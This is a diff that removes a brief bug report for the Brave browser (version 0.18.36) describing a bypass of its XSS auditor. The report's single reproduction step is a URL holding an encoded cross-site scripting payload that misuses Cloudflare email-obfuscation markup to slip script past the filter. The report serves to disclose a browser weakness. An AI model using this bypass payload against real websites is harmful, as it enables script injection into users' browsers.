@@ -1,9 +1,0 @@
-XSS Auditor Bypass
-
-
-Steps to Reproduce
-
-Open: https://waf.party/xss.php?xss=%3Csvg%3E%3Cscript+x%3E%3Csvg+data-cfemail=%2200616C657274283129%22+class=%22__cf_email__%22/%3E%3Cforeignobject%3E%3Ca+href=mailto:a%3E%3C/a%3E%3Cbody%3E%3C/body%3E%3C/foreignobject%3E%3C/script/%3E%3C/svg%3E
-
-Brave Version
-0.18.36
